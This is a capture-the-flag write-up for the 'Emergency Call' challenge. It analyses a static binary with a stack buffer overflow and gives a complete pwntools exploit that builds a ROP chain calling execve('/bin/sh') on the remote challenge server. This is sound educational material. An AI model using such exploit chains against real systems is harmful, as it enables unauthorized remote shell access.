# Emergency Call

| | |
|---|---|
| **Section** | Software Security |
| **Category** | binary |
| **Solves** | 216 |

## Overview

`objdump -d -Mintel` shows the binary is fully static with no libc: `_start` is hand-written and `main` issues raw syscalls through a generic wrapper at `0x40101d` (args in `rdi,rsi,rdx,rcx,r8,r9` → remapped to `rax,rdi,rsi,rdx,r10,r8` before `syscall`). Right after it sit a few useful one-instruction gadgets:

```
401032: pop rdi ; ret
401034: pop rsi ; ret
401036: pop rdx ; ret
401038: xor rax,rdi ; ret
40102f: syscall ; ret
```

`main` does, in order:

1. `write(1, 0x402000, 0x31)` – intro banner
2. `read(0, 0x404000, 8)` – reads 8 bytes into a fixed, writable `.data` address
3. `write(1, 0x402032, 0x1a)` – second banner
4. `read(0, rbp-0x20, 0x80)` – reads 128 bytes into a 32-byte stack buffer

No PIE, no canary, no libc → classic stack bof with fixed addresses, offset to return address = 32 (buffer) + 8 (saved rbp) = **40 bytes**. Since there's no libc, a `ret2libc` isn't possible, but the binary itself gives everything needed to build an `execve("/bin/sh", NULL, NULL)` purely from raw syscalls, using the `/bin/sh` write primitive from point 2 to plant the string at a known static address.

## Solve

1. Use the initial 8-byte `read` to write `/bin/sh\x00` at `0x404000`.
2. Overflow the second `read` with a ROP chain that sets `rax=59` (`pop rdi;59` + `xor rax,rdi`, rax starts at 0), `rdi=&"/bin/sh"`, `rsi=rdx=0`, then `syscall`.

```python
from pwn import *

chall = remote("emergency.challs.olicyber.it", 10306)

POP_RDI     = 0x401032
POP_RSI     = 0x401034
POP_RDX     = 0x401036
XOR_RAX_RDI = 0x401038
SYSCALL     = 0x40102f
BIN_SH_ADDR = 0x404000

chall.recvuntil(b"> ")
chall.send(b"/bin/sh\x00")

chall.recvuntil(b"> ")

payload  = b"A" * 40
payload += p64(POP_RDI) + p64(59) + p64(XOR_RAX_RDI)   # rax = 59 (execve)
payload += p64(POP_RDI) + p64(BIN_SH_ADDR)             # rdi = "/bin/sh"
payload += p64(POP_RSI) + p64(0)                       # rsi = NULL
payload += p64(POP_RDX) + p64(0)                       # rdx = NULL
payload += p64(SYSCALL)

chall.send(payload)
chall.interactive()
```

Shell obtained → `cat flag`.